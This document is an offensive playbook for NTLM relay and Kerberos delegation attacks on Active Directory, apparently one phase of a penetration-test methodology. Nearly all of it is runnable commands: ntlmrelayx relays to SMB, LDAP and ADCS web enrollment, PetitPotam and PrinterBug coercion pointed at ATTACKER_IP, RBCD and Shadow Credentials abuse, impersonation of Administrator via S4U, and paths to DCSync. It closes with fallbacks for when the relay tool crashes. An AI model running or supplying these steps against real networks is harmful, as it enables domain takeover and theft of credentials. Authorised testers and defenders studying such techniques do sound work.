# Phase 4: Relay & Delegation Attacks

## Gate: NTLM relay tested, delegation paths exploited or documented as blocked

## Steps

### 4.0 NTLM Relay Readiness Checklist (MANDATORY before relay setup)
```bash
# Step 1: Verify LDAP signing status (relay viable only if NOT required)
python3 -c "import ldap3; c=ldap3.Connection(ldap3.Server('<DC>'),user='DOMAIN\\\\user',password='pass',authentication=ldap3.NTLM); print('LDAP RELAY VIABLE' if c.bind() else 'LDAP SIGNING ENFORCED')"

# Step 2: Verify SMB signing on targets
crackmapexec smb <subnet>/24 --gen-relay-list relay-targets.txt

# Step 3: Validate coercion FIRST with smbserver.py capture
smbserver.py share /tmp -smb2support > /tmp/capture.log 2>&1 &
# Trigger coercion → check /tmp/capture.log for AUTHENTICATE_MESSAGE
# If no auth received → coercion method is blocked, try another

# Step 4: Confirm impacket version (0.13.x segfaults on relay)
python3 -c "import impacket; print(impacket.__version__)"
# If 0.13.x → downgrade: pip3 install impacket==0.10.0

# Step 5: Kill capture server, start ntlmrelayx, re-trigger coercion
pkill -f smbserver; sleep 1
ntlmrelayx.py -t ldap://<DC> --escalate-user <user> -smb2support
# Re-trigger same coercion method
```

### 4.1 Pre-Check: Signing Status
```bash
# SMB signing (relay blocked if required)
crackmapexec smb <subnet>/24 --gen-relay-list relay-targets.txt
# Only hosts with signing NOT required are relayable

# LDAP signing
crackmapexec ldap <DC> -u user -p pass -M ldap-checker
# LDAP signing + channel binding = relay blocked
```

### 4.2 NTLM Relay to SMB
```bash
# Setup relay (targets = hosts without SMB signing)
impacket-ntlmrelayx -tf relay-targets.txt -smb2support

# Trigger auth (Responder, PetitPotam, PrinterBug, coerce)
python3 PetitPotam.py ATTACKER_IP <DC>

# On relay success: SAM dump, shell, or secretsdump
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c 'whoami'
```

### 4.3 NTLM Relay to LDAP (Shadow Credentials / RBCD)
```bash
# Relay to LDAP → set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
impacket-ntlmrelayx -t ldap://<DC> --delegate-access --escalate-user attacker$

# Then request service ticket via S4U
impacket-getST -spn cifs/<target> -impersonate Administrator \
  DOMAIN/attacker$:pass -dc-ip <DC>

# Relay to LDAP → Shadow Credentials (add key credential)
impacket-ntlmrelayx -t ldap://<DC> --shadow-credentials --shadow-target <victim$>
```

### 4.4 NTLM Relay to ADCS (ESC8)
```bash
# If CA has HTTP enrollment enabled without EPA
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Coerce DC to authenticate → relay to CA → get DC certificate
python3 PetitPotam.py ATTACKER_IP <DC>
# Use certificate to authenticate as DC → DCSync
```

### 4.5 Unconstrained Delegation
```bash
# Find unconstrained delegation computers (BloodHound or LDAP)
# If you compromise one → TGT of any user authenticating to it is cached

# Monitor for incoming TGTs (Rubeus on compromised host)
Rubeus.exe monitor /interval:5 /filteruser:DC$

# Coerce DC authentication to delegation host
python3 SpoolSample.py <DC> <delegation-host>
# Capture DC$ TGT → DCSync
```

### 4.6 Constrained Delegation
```bash
# Find constrained delegation (msDS-AllowedToDelegateTo)
impacket-findDelegation -dc-ip <DC> DOMAIN/user:pass

# S4U2Self + S4U2Proxy → impersonate admin to target service
impacket-getST -spn <target_spn> -impersonate Administrator \
  -dc-ip <DC> DOMAIN/svc_account:pass

# RBCD (Resource-Based Constrained Delegation)
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on target:
impacket-rbcd -delegate-to TARGET$ -delegate-from ATTACKER$ \
  -dc-ip <DC> DOMAIN/user:pass -action write
```

### 4.7 Coercion Methods (trigger NTLM auth)

| Method | Tool | Prerequisite |
|--------|------|-------------|
| PetitPotam | PetitPotam.py | EFS RPC (usually open) |
| PrinterBug | SpoolSample.py | Spooler service running |
| DFSCoerce | DFSCoerce.py | DFS service |
| ShadowCoerce | ShadowCoerce.py | VSS RPC |

## Decision Tree
```
SMB signing disabled on targets?
├── YES → NTLM relay to SMB (secretsdump)
└── NO → Check LDAP signing
         ├── LDAP signing disabled → Relay to LDAP (RBCD/Shadow Creds)
         └── LDAP signing enabled → Check ADCS HTTP
              ├── ADCS HTTP without EPA → ESC8 relay
              └── All signed → Skip relay, focus on delegation abuse
```

## Pitfalls
- Modern DCs: SMB signing required by default — relay targets are usually member servers
- LDAP channel binding: blocks all LDAP relay on Server 2022+ with Feb 2020+ patches
- PetitPotam: patched for unauthenticated use — may need valid creds
- Unconstrained delegation: only captures TGTs of users who AUTHENTICATE to that host

## Relay Tool Failure Fallbacks

When ntlmrelayx crashes/segfaults (common on impacket 0.13.x):

| Step | Action |
|------|--------|
| 1 | Downgrade: `pip3 install impacket==0.10.0` |
| 2 | Try from different host (Kali, local machine, Linux pivot host) |
| 3 | SSH reverse tunnel: `ssh -R 445:localhost:445 root@<listener>` then run ntlmrelayx locally |
| 4 | Minimal custom Python relay using impacket SMBRelayServer + LDAPRelayClient classes directly |
| 5 | If ALL relay fails: capture NTLMv2 hash with smbserver.py → try offline crack (unlikely for machine accts) |

Key lesson: ALWAYS validate coercion works (smbserver.py capture) BEFORE investing time in relay setup.
